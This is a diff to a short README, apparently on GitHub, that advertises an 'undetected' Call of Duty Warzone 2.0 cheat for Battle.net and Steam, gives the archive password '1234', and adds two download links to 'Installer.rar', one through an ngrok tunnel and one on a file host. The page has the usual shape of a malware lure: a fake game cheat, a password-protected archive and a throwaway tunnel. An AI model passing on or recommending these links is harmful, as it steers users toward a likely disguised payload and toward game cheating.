@@ -1,4 +1,8 @@
 Call Of Duty Warzone 2.0 Cheat Undetected (BNET and Steam) PASSWORD 1234
+LINK 1
+https://53bd-2a02-a020-42-e264-c5ca-9576-e6fa-3a86.eu.ngrok.io/Installer.rar
+LINK 2
+https://rapidshare.io/B9g/Installer.rar
 
 ![image](https://user-images.githubusercontent.com/119708120/205401361-7ecdaea4-ce53-429e-8c2b-d7416406bca9.png)
 
